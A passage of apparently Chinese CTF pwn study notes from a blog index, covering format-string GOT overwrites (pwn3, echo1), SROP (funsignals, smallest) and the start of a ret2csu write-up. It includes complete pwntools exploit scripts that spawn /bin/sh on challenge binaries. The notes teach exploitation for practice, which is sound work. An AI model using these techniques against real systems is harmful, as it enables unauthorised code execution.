class=\"number\">7</span>, &#123;puts_got: system_addr&#125;)</span><br><span class=\"line\">put(<span class=\"string\">&#x27;/bin/sh;&#x27;</span>, payload)</span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;ftp&gt;&#x27;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;get&#x27;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;enter the file name you want to get:&#x27;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;/bin/sh;&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">show()</span><br></pre></td></tr></table></figure>\n<p>  ​    这里其实主要的问题都是被<code>fmtstr_payload</code>函数解决了。</p>\n<p>  ​    这个函数是pwntools的一个集成的功能，含义就是，格式化字符串是栈上第七个参数，然后需要将system的地址写入puts的got表地址。</p>\n<p>  ​    关于函数是如何实现的，可以参见另外一篇笔记。<a href=\"https://fuurinko.github.io/2021/10/27/摆烂第六天--格式化字符串偏移计算原理/\">格式化字符串偏移计算原理</a></p>\n<h5><span id=\"手动实现\">手动实现</span></h5><p>  ​        等等再写。</p>\n<p>  ​        </p>\n<h4><span id=\"调用show实现getshell\">调用show，实现getshell</span></h4><p>  最后调用show，也就是puts函数，puts的content的是binsh，就相当于getshell。</p>\n<pre><code> ![截屏2022-03-22 上午11.33.03](https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-22%20%E4%B8%8A%E5%8D%8811.33.03.png)\n</code></pre><p>  可以看到确实puts的got表被改为了system的地址。</p>\n<p>  但是感觉情况与我期待的并不一样，当调用<code>fmt_payload</code>module的时候，puts的got表并没有被修改，而是在最后show（）的时候才突然变成了system。<img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-22%20%E4%B8%8B%E5%8D%883.54.02.png\" alt=\"截屏2022-03-22 下午3.54.02\"></p>\n<p>  ​        发现问题所在了。system的地址根本不是system。。真的逆天，这个确实不知道该怎么办了，got表也改了，函数参数也传入了，但是地址不对。。。为什么。</p>\n<h4><span id=\"完整exp\">完整exp：</span></h4>  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import LibcSearcher</span></span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;/glibc/2.23/32/lib/libc-2.23.so&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;./pwn3&quot;</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&quot;./pwn3&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get</span>(<span class=\"params\">name</span>):</span></span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;get&#x27;</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;enter the file name you want to get:&#x27;</span>)</span><br><span class=\"line\">    p.sendline(name)</span><br><span class=\"line\">    data = p.recv()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> data</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">put</span>(<span class=\"params\">name, content</span>):</span></span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;put&#x27;</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;please enter the name of the file you want to upload:&#x27;</span>)</span><br><span class=\"line\">    p.sendline(name)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;then, enter the content:&#x27;</span>)</span><br><span class=\"line\">    p.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span>():</span></span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;dir&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;Name (ftp.hacker.server:Rainism):&#x27;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;rxraclhm&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get the addr of puts</span></span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;puts got : &#x27;</span> + <span class=\"built_in\">hex</span>(puts_got))</span><br><span class=\"line\">put(<span class=\"string\">b&#x27;aa&#x27;</span>, <span class=\"string\">b&#x27;%8$s&#x27;</span> + p32(puts_got))</span><br><span class=\"line\">puts_addr = u32(get(<span class=\"string\">&#x27;aa&#x27;</span>)[:<span class=\"number\">4</span>])</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;puts_addr : &#x27;</span> + <span class=\"built_in\">hex</span>(puts_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">system_off = libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">puts_off = libc.symbols[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">libc_base = puts_addr - puts_off</span><br><span class=\"line\">system_addr = libc_base + system_off</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;system addr : &#x27;</span> + <span class=\"built_in\">hex</span>(system_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">payload = fmtstr_payload(<span class=\"number\">7</span>, &#123;puts_got: system_addr&#125;)</span><br><span class=\"line\">put(<span class=\"string\">&#x27;/bin/sh;&#x27;</span>, payload)</span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;ftp&gt;&#x27;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;get&#x27;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;enter the file name you want to get:&#x27;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;/bin/sh;&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">show()</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h3><span id=\"echo1\">echo1</span></h3><h4><span id=\"逆向\">逆向</span></h4><p>  ​        没啥好逆的，输入字符，然后输出字符，纯纯格式化字符串。</p>\n  <figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">do</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  fgets(s, <span class=\"number\">256</span>, <span class=\"built_in\">stdin</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(s);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">while</span> ( <span class=\"built_in\">strcmp</span>(s, <span class=\"string\">&quot;exit\\n&quot;</span>) );</span><br><span class=\"line\">system(<span class=\"string\">&quot;echo Goodbye&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br></pre></td></tr></table></figure>\n<h4><span id=\"利用\">利用</span></h4><p>  ​        由于system的地址已经知道了，就没有必要再泄露，直接利用fmt模块将ptintf got覆盖就行。</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./echo&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#r = process(&#x27;node4.buuoj.cn&#x27;,26117)</span></span><br><span class=\"line\">r = process(<span class=\"string\">&quot;./echo&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">printf_got = elf.got[<span class=\"string\">&#x27;printf&#x27;</span>]</span><br><span class=\"line\">printf_got = <span class=\"number\">0x804A010</span></span><br><span class=\"line\"><span class=\"comment\">#system_plt = elf.plt[&#x27;system&#x27;]</span></span><br><span class=\"line\">system_plt = <span class=\"number\">0x8048400</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = fmtstr_payload(<span class=\"number\">7</span>,&#123;printf_got:system_plt&#125;)</span><br><span class=\"line\">r.sendline(payload)</span><br><span class=\"line\">r.sendline(<span class=\"string\">&#x27;/bin/sh;&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<p>  ​        另外其实可以尝试一下手动修改。</p>\n<p>  ​        其实就是把<code>0x804A010</code>改成<code>0x8048400</code>。</p>\n<p>  ​        所以payload大概长这样</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">payload = p32(<span class=\"number\">0x804A010</span>)  + <span class=\"string\">b&#x27;%xxxxc&#x27;</span>+ <span class=\"string\">b&#x27;%6$hn&#x27;</span>  </span><br></pre></td></tr></table></figure>\n<p>  ​        </p>\n<h3><span id=\"echo2\">echo2</span></h3><p>  ​        整个程序与echo1基本没有区别（估计只有编译参数不一样），但是是64位，并且开启了随机化。</p>\n<p>  ​        并且在栈上的参数的偏移（也）是7+6 = 13。</p>\n<p>  ​        但是值得注意的求偏移时，由于程序是64位，所以并不适合用pwntools的fmt模块，因为    </p>\n<p>  ​        </p>\n<p>  ​        </p>\n<p>  ​        </p>\n<h1><span id=\"总结\">总结</span></h1><p>  ​    通过这篇笔记我确实是认识到自动化脚本的重要性，其实我觉得但凡真正入门了pwn，就不会再浪费时间于一些明明可以自动化完成的东西，就比如说rop有相应的脚本roputil，有onegadget，但是我总是拒绝去用这些东西，反而将大把时间浪费于无谓的调试以及历史脚本的复制粘贴上。</p>\n<p>  ​    然而简单的题目尚且可以通过手工构造，如果是实战或者盲打，上哪里手工构造呢？我总有一天要面对这个东西，为什么不早点接受呢？</p>\n<h1><span id=\"参考\">参考</span></h1><p>  <a href=\"https://zhuanlan.zhihu.com/p/79504011\">缓冲区机制详解</a></p>\n<p>  <a href=\"http://c.biancheng.net/cpp/html/2506.html\">C语言fflush()函数：清空文件缓冲区（或标准输入输出缓冲区）</a></p>\n<p>  <a href=\"https://stackoverflow.com/questions/38685724/difference-between-ms-and-s-scanf\">difference between %ms and %s scanf</a></p>\n<p>  <a href=\"https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-example/\">格式化字符串</a></p>\n<p>  <a href=\"格式化字符串利器fmtstr_payload | 攻防世界 pwn进阶区 实时数据监测\">格式化字符串利器fmtstr_payload | 攻防世界 pwn进阶区 实时数据监测</a></p>\n<p>  <a href=\"https://docs.pwntools.com/en/stable/fmtstr.html#module-pwnlib.fmtstr\"><code>pwnlib.fmtstr</code>— Format string bug exploitation tools</a> </p>\n<p>  <a href=\"https://blog.csdn.net/weixin_43092232/article/details/105647076\">格式化字符串利器fmtstr_payload | 攻防世界 pwn进阶区 实时数据监测</a></p>\n<p>  <a href=\"https://blog.csdn.net/qq_33976344/article/details/113503914\">pwntools中fmtstr的使用</a></p>\n<p>  <a href=\"https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.1_format_string.html#格式化字符串漏洞利用\">3.1.1 格式化字符串漏洞</a></p>\n<p>  <a href=\"https://blog.csdn.net/CLHugh/article/details/75000104\">Python中self用法详解</a></p>\n<p>​</p>\n","categories":["Binary_security"],"tags":["STACK - Format"]},{"title":"SROP学习","url":"/2021/11/07/stack_learningsrop%E5%AD%A6%E4%B9%A0/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-mftobSjb\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>  \n<h2><span id=\"1前言\">1)前言</span></h2><p>​        在看完csapp的异常控制流之后，对于信号以及系统调用有了更加深入的了解，故借此机会探明SROP，这个本身并不复杂的知识点。</p>\n<h2><span id=\"2srop原理\">2）SROP原理</span></h2><p>​         当用户向内核发起signal时，此时系统切换为内核态，并且由内核保存进程的上下文（通常是一些寄存器状态）至用户栈，然后切换回用户态，执行信号处理程序。程序执行完毕后，再次切换成内核态，将保存的寄存器状态恢复后返回用户态。</p>\n<p>​        所以这一串来回切换中，一个缺陷就是第一次切换时上下文保存于用户栈中，所以正好我们可以通过栈溢出控制栈中的数据，而且当寄存器恢复时，内核并不会检查栈中的内容是否被篡改。</p>\n<p>​        借一张图说明一下：</p>\n<p><img src=\"https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/figure/ProcessOfSignalHandlering.png\" alt=\"Process of Signal Handlering\"></p>\n<h2><span id=\"3srop利用\">3）SROP利用</span></h2><p>​        pwntools中为我们集成了srop利用的工具,接下来我们通过一个极为刻意的例子演示一下如何利用。</p>\n<h3><span id=\"funsignal\">funsignal</span></h3><p>​        题目地址： <a href=\"https://github.com/fuurinko/CTF-TASK/blob/main/funsignals_player_bin\">funsignals</a> </p>\n<p>​        打开题目，是手写汇编。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8B%E5%8D%883.36.29.png\" alt=\"截屏2021-11-09 下午3.36.29\"></p>\n<p>​        观察一下。程序分别通过系统调用，调用了<code>sys_read</code>, <code>sys_sigreturn</code>两个函数。</p>\n<p>​        那么很明显，<code>sys_read</code>用来栈溢出，然后 <code>sys_sigreturn</code>作为返回地址。并且flag的地址都已经给出，我们只需要通过<code>sys_write</code>读出flag的值就行。</p>\n<p>​        所以我们需要构造<code>sys_write</code>的调用</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">frame = SigreturnFrame()</span><br><span class=\"line\">frame.rax = constants.SYS_write<span class=\"comment\">#write函数的系统调用号</span></span><br><span class=\"line\">frame.rdi = constants.STDOUT_FILENO<span class=\"comment\">#1</span></span><br><span class=\"line\">frame.rsi = elf.symbols[<span class=\"string\">&#x27;flag&#x27;</span>]<span class=\"comment\">#0x010000023</span></span><br><span class=\"line\">frame.rdx = <span class=\"number\">50</span><span class=\"comment\">#读取的字符数</span></span><br><span class=\"line\">frame.rip = elf.symbols[<span class=\"string\">&#x27;syscall&#x27;</span>]</span><br></pre></td></tr></table></figure>\n<p>​        这里就类似pwntools的rop模块，只是把需要的东西生成一下然后存起来。当程序调用<code>sys_read</code>的时候把东西读进用户栈，然后接着调用 <code>sys_sigreturn</code>让内核将用户栈的东西恢复，就相当于调用了<code>sys_write</code>，从而读出flag的值。</p>\n<p>​        但是这道题将我们需要的任何地址都给出了，甚至也不需要构造<code>sys_sigreturn</code>，我们通过另外一个例子来演示一下如何构造<code>sys_sigreturn</code>并且获得一个shell。</p>\n<h3><span id=\"smallest-pwn\">Smallest Pwn</span></h3><p>​        题目：<a href=\"https://buuoj.cn/challenges#360chunqiu2017_smallest\">smallest pwn</a></p>\n<p>​        直接先在IDA中查看：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">start           proc near               ; DATA XREF: LOAD:0000000000400018↑o</span><br><span class=\"line\">.text:00000000004000B0                 xor     rax, rax</span><br><span class=\"line\">.text:00000000004000B3                 mov     edx, 400h       ; count</span><br><span class=\"line\">.text:00000000004000B8                 mov     rsi, rsp        ; buf</span><br><span class=\"line\">.text:00000000004000BB                 mov     rdi, rax        ; fd</span><br><span class=\"line\">.text:00000000004000BE                 syscall                ; LINUX - sys_read</span><br><span class=\"line\">.text:00000000004000C0                 retn</span><br><span class=\"line\">.text:00000000004000C0 start           endp</span><br><span class=\"line\">.text:00000000004000C0</span><br><span class=\"line\">.text:00000000004000C0 _text           ends</span><br><span class=\"line\">.text:00000000004000C0</span><br><span class=\"line\">.text:00000000004000C0</span><br><span class=\"line\">.text:00000000004000C0                 end start</span><br></pre></td></tr></table></figure>\n<h4><span id=\"ctf-wiki题解\">ctf-wiki题解</span></h4><p>​        可以看到程序本身就是一个<code>sys_read</code>。所以我们需要利用它来getshell，难度可想而知。</p>\n<p>​        由于题目只给出了<code>sys_read</code>，但是泄露程序内存我们肯定是需要一个<code>sys_write</code>    的，所以这里有一个trick，就是通过将<code>sys_read</code>的返回值构造成函数的系统调用号。然后调用<code>sys_write</code>以及<code>sys_sigreturn</code>。</p>\n<p>​        那么来看详细的分析</p>\n<p>​        首先需要调用<code>sys_write</code>，系统调用号为4，也就是需要<code>sys_read</code>返回读入四个字符，将rax的值赋为4。</p>\n<p>​        顺便<code>sys_sigreturn</code>的返回值为119。</p>\n<p>​        然后看exp：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">payload = p64(start_addr) * <span class=\"number\">3</span></span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">## modify the return addr to start_addr+3</span></span><br><span class=\"line\"><span class=\"comment\">## so that skip the xor rax,rax; then the rax=1</span></span><br><span class=\"line\"><span class=\"comment\">## get stack addr</span></span><br><span class=\"line\">sh.send(<span class=\"string\">&#x27;\\xb3&#x27;</span>)</span><br><span class=\"line\">stack_addr = u64(sh.recv()[<span class=\"number\">8</span>:<span class=\"number\">16</span>])</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;leak stack addr :&#x27;</span> + <span class=\"built_in\">hex</span>(stack_addr))</span><br></pre></td></tr></table></figure>\n<p>​        首先发送三次<code>start_addr</code>，第一次使得程序执行流重新回到start，但是在重新执行时输入<code>\\xb3</code>    ,覆盖我们刚刚输入的三个开始地址中的第二个，以至于程序会重新执行start函数，但是是从<code>0x4000B3</code>开始。(第三个地址的作用会在后面体现)</p>\n<p>​    同时我们读入的<code>\\xb3</code>    ,仅有一个字节，这使得<code>sys_read</code>的返回值为1，存在rax中，程序在这里就相当于执行了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mov     rax, 1</span><br><span class=\"line\">mov     edx, 400h       ; count</span><br><span class=\"line\">mov     rsi, rsp        ; buf</span><br><span class=\"line\">mov     rdi, rax        ; fd</span><br><span class=\"line\">syscall                ; LINUX - sys_write</span><br></pre></td></tr></table></figure>\n<p>所以此时相当于进行了一个系统调用号为1的系统调用,也就是<code>sys_write</code>函数。</p>\n<p>​    并且读出的内容就是rsp的值，也就相当于泄露了一个栈地址。</p>\n<p>​    回忆一下，srop的关键是通过<code>sys_sigreturn</code>来恢复我们构造的用户栈上的寄存器状态，那么现在我们得到了用户栈的地址，我们就能够在用户栈中写入一些我们想要的东西。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">## make the rsp point to stack_addr</span></span><br><span class=\"line\"><span class=\"comment\">## the frame is read(0,stack_addr,0x400)</span></span><br><span class=\"line\">sigframe = SigreturnFrame()<span class=\"comment\">#创建一个SigreturnFrame，没啥好说的</span></span><br><span class=\"line\">sigframe.rax = constants.SYS_read<span class=\"comment\">#确定我们希望调用的函数的系统调用号</span></span><br><span class=\"line\">sigframe.rdi = <span class=\"number\">0</span><span class=\"comment\">#read参数</span></span><br><span class=\"line\">sigframe.rsi = stack_addr<span class=\"comment\">#read参数，在栈上读入</span></span><br><span class=\"line\">sigframe.rdx = <span class=\"number\">0x400</span><span class=\"comment\">#read参数，读多大</span></span><br><span class=\"line\">sigframe.rsp = stack_addr<span class=\"comment\">#sigframe参数</span></span><br><span class=\"line\">sigframe.rip = syscall_ret<span class=\"comment\">#sigframe参数，这里是syscall+retn的地址</span></span><br><span class=\"line\">payload = p64(start_addr) + <span class=\"string\">&#x27;a&#x27;</span> * <span class=\"number\">8</span> + <span class=\"built_in\">str</span>(sigframe)</span><br><span class=\"line\">sh.send(payload)</span><br></pre></td></tr></table></figure>\n<p>​    接着我们开始构造<code>sys_sigreturn</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">## set rax=15 and call sigreturn</span></span><br><span class=\"line\">sigreturn = p64(syscall_ret) + <span class=\"string\">&#x27;b&#x27;</span> * <span class=\"number\">7</span><span class=\"comment\">#读入15字节</span></span><br><span class=\"line\">sh.send(sigreturn)<span class=\"comment\">#利用与第一段payload同理。将返回地址覆盖成syscall+ret，进行系统调用，而此时rax已经被设置成15.</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>​            这样我们就成功地调用了<code>sys_sigreturn</code>,此时我们已经可以向用户栈中读入任意数据了。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">## call execv(&quot;/bin/sh&quot;,0,0)</span></span><br><span class=\"line\">sigframe = SigreturnFrame()</span><br><span class=\"line\">sigframe.rax = constants.SYS_execve</span><br><span class=\"line\">sigframe.rdi = stack_addr + <span class=\"number\">0x120</span>  <span class=\"comment\"># &quot;/bin/sh&quot; &#x27;s addr</span></span><br><span class=\"line\">sigframe.rsi = <span class=\"number\">0x0</span></span><br><span class=\"line\">sigframe.rdx = <span class=\"number\">0x0</span></span><br><span class=\"line\">sigframe.rsp = stack_addr</span><br><span class=\"line\">sigframe.rip = syscall_ret</span><br><span class=\"line\"></span><br><span class=\"line\">frame_payload = p64(start_addr) + <span class=\"string\">&#x27;b&#x27;</span> * <span class=\"number\">8</span> + <span class=\"built_in\">str</span>(sigframe)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">len</span>(frame_payload)</span><br><span class=\"line\">payload = frame_payload + (<span class=\"number\">0x120</span> - <span class=\"built_in\">len</span>(frame_payload)) * <span class=\"string\">&#x27;\\x00&#x27;</span> + <span class=\"string\">&#x27;/bin/sh\\x00&#x27;</span></span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\">sh.send(sigreturn)</span><br></pre></td></tr></table></figure>\n<p>​        我们再次利用<code>SigreturnFrame()</code>来构造我们读入用户栈的内容。内容也比较直观，就是一个·类似shellcode的东西。然后再调用<code>sys_sigreturn</code>来触发。</p>\n<p>​        所以总结下来就是，先通过读入一个字符覆盖start函数地址，调用<code>sys_write</code>泄露栈地址，通过两次调用<code>sys_sigreturn</code>，第一次执行<code>sys_read</code>，将<code>execute(&quot;/bin/sh&quot;)</code>写入用户栈，第二次调用<code>sys_sigreturn</code>来getshell。</p>\n<h4><span id=\"自己的反思\">自己的反思</span></h4><p>​        有一个疑惑，就是既然我们能够通过控制rax而控制<code>syscall</code>，而普通的<code>sys_read</code>也是将用户输入储存到栈上，那为什么还要多此一举，去获得rsp的地址，再将shellcode写到那上面呢？</p>\n<p>​        怀着这样的问题，果然我在网上找到了一个和我想法完全一致的人。他的exp的关键部分是这样的：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">reread = <span class=\"number\">0x4000b0</span></span><br><span class=\"line\">syscall = <span class=\"number\">0x4000be</span></span><br><span class=\"line\"></span><br><span class=\"line\">rereadaddr = p64(reread)</span><br><span class=\"line\">syscalladdr = p64(syscall)</span><br><span class=\"line\"></span><br><span class=\"line\">context.clear()</span><br><span class=\"line\">context.arch = <span class=\"string\">&quot;amd64&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">frame = SigreturnFrame()</span><br><span class=\"line\">frame.rax = <span class=\"number\">59</span></span><br><span class=\"line\">frame.rdi = <span class=\"number\">0x7fffffffe4e8</span></span><br><span class=\"line\">frame.rip = syscall</span><br><span class=\"line\"></span><br><span class=\"line\">binsh=<span class=\"string\">&#x27;/bin/sh&#x27;</span> </span><br><span class=\"line\"></span><br><span class=\"line\">playload1 = rereadaddr+<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">8</span>+ <span class=\"built_in\">str</span>(frame)+binsh</span><br><span class=\"line\">p.send(playload1)</span><br><span class=\"line\"></span><br><span class=\"line\">playload2 = syscalladdr+<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">7</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.send(playload2)</span><br><span class=\"line\"><span class=\"comment\">#http://www.reshahar.com/2017/05/04/360春秋杯smallest-pwn的学习与利用/</span></span><br></pre></td></tr></table></figure>\n<p>​            </p>\n<p>​        可以看到细节和wiki给出的几乎一样，如果思路行得通，那么应该不会跑出问题，然而当我运行的时候，发现果不其然，EOF了。</p>\n<p>​        去查了一些资料，发现还是对于<code>SigreturnFrame()</code>的理解不够透彻。    </p>\n<p>​        <code>SigreturnFrame()</code>中有一个非常重要的part：<code>sigframe.rsp</code></p>\n<p>​        我们自己构造的寄存器状态肯定是需要rsp的值的，并且这里rsp肯定也是要可写的，不然后面我们无法把getshell的函数写进去，所以我们这里肯定要指定一个可写的栈上的地址。</p>\n<p>​        所以之前那种想法就不攻自破了，在那种情况下我们无法获取任何栈上的地址，自然也没有东西可以填，所以还是需要通过<code>sys_write</code>    ,来回跳转执行流。</p>\n<h2><span id=\"4总结\">4）总结</span></h2><p>​        非常有意思的一个知识点，但是非常奇怪的是我花在理解上的时间比之前任何知识点都短，可能是我之前嗯啃csapp，对于信号，系统调用等稍有了解。也可能是我研究例题的时候完全是参考涅普的视频教程，有pwn奶奶的细节讲解。（这个可能比较重要），说到底还是知识点本身比较简单。</p>\n<h2><span id=\"5参考\">5）参考</span></h2><p>​        </p>\n<p><a href=\"https://blog.csdn.net/qq_29343201/article/details/72627439\">2017 429 ichunqiu ctf smallest(pwn300) writeup</a>        </p>\n<p><a href=\"https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/#_5\">SROP</a></p>\n","categories":["Binary_security"],"tags":["STACK - SROP"]},{"title":"jarvisoj_level5","url":"/2022/03/20/stack_ret2csu/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-wraVEbEm\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>   \n<h4><span id=\"jarvisoj_level5\">jarvisoj_level5</span></h4><p>​        这个题吧，我好像以前做过，是个纯纯的ret2csu的板子题。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> LibcSearcher</span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#libc = ELF(&quot;&quot;)</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&quot;./level3_x64&quot;</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">&quot;./level3_x64&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">0ffset = <span class=\"number\">0x88</span><span class=\"comment\">#(test)</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">csu_front_addr = <span class=\"number\">0x400690</span></span><br><span class=\"line\">csu_end_addr = <span class=\"number\">0x4006AA</span></span><br><span class=\"line\"></span><br><span class=\"line\">puts_plt = elf.plt[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">libc_start_main_got = elf.got[<span class=\"string\">&#x27;__libc_start_main&#x27;</span>]</span><br><span class=\"line\">main = elf.symbols[<span class=\"string\">&#x27;main&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">write_got = elf.got[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">read_got = elf.got[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\">main_addr = elf.symbols[<span class=\"string\">&#x27;main&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">csu</span>(<span class=\"params\">rbx, rbp, r12, r13, r14, r15, last</span>):</span></span><br><span class=\"line\">    <span class=\"comment\"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class=\"line\">    <span class=\"comment\"># rbx should be 0,</span></span><br><span class=\"line\">    <span class=\"comment\"># rbp should be 1,enable not to jump</span></span><br><span class=\"line\">    <span class=\"comment\"># r12 should be the function we want to call</span></span><br><span class=\"line\">    <span class=\"comment\"># rdi=edi=r15d</span></span><br><span class=\"line\">    <span class=\"comment\"># rsi=r14</span></span><br><span class=\"line\">    <span class=\"comment\"># rdx=r13</span></span><br><span class=\"line\">    payload = <span 